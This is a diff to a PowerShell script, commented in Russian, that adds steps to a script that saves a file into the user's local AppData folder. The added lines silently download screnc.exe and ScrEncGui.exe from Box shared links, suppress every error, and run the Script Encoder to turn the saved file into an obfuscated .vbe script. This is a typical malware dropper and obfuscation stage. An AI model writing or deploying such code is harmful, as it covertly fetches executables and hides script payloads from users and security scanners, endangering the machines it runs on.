@@ -99,3 +99,33 @@ if ($null -eq $finalContent) { exit 1 }
 # СОХРАНЕНИЕ ФАЙЛА 1446062403_house
 $outputPath = Join-Path $env:LOCALAPPDATA "1446062403_house"
 $finalContent | Out-File -FilePath $outputPath -Encoding Default -Force
+
+# СКРЫТО СКАЧИВАЕМ SCRENC.EXE
+$Url1 = "https://app.box.com/index.php?rm=box_download_shared_file&shared_name=yqig0imez8ep1i1swir3xenzyq6wbaxt&file_id=f_2272814421466"
+$FileName1 = "screnc.exe"
+$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
+$DownloadPath1 = Join-Path $LocalAppData $FileName1
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($Url1, $DownloadPath1)
+}
+catch {
+}
+
+# СКРЫТО СКАЧИВАЕМ SCRENCGUI.EXE
+$Url2 = "https://app.box.com/index.php?rm=box_download_shared_file&shared_name=gr335kywfwrcos7h9t1dsjtnxj837i8x&file_id=f_2272796614990"
+$FileName2 = "ScrEncGui.exe"
+$DownloadPath2 = Join-Path $LocalAppData $FileName2
+try {
+    $webClient2 = New-Object System.Net.WebClient
+    $webClient2.DownloadFile($Url2, $DownloadPath2)
+}
+catch {
+}
+
+# КОДИРОВАНИЕ ЧЕРЕЗ SCRENC
+$screncPath = Join-Path $env:LOCALAPPDATA "screnc.exe"
+$outputVbePath = Join-Path $env:LOCALAPPDATA "1446062403_house.vbe"
+if (Test-Path $screncPath) {
+    & $screncPath /s /f /tp=v /e=vbs /op=s /ret=15 $outputPath $outputVbePath
+}
